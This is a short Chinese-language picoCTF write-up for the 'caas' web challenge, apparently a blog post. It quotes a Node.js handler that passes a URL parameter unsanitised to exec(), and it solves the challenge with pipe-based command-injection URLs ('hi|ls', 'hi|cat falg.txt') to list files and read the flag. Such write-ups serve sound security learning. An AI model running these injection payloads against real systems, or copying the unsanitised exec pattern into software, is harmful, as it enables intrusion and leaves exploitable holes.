@@ -1,0 +1,49 @@
+---
+title: 'caas'
+description: ''
+pubDate: '2026-04-03'
+tags: ['picoCTF', 'Web']
+category: 'WriteUp'
+---
+
+分類：Web  
+難度：Medium
+
+### 工具
+
+None
+
+### 過程
+
+看原始碼就是一個 Call 指令的服務
+
+```js
+app.get('/cowsay/:message', (req, res) => {
+  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
+    if (error) return res.status(500).end();
+    res.type('txt').send(stdout).end();
+  });
+});
+```
+
+所以直接嘗試指令連接來叫其他指令先打這支 URL
+
+```
+https://caas.mars.picoctf.net/cowsay/hi
+```
+
+這裡回傳很正常，因為還沒連接
+
+```
+https://caas.mars.picoctf.net/cowsay/hi|ls
+```
+
+這裡就會爆出目前目錄
+
+然後會看到他的 flag 還拼錯了
+
+```
+https://caas.mars.picoctf.net/cowsay/hi|cat%20falg.txt
+```
+
+OK 答案很詭異但就是答案
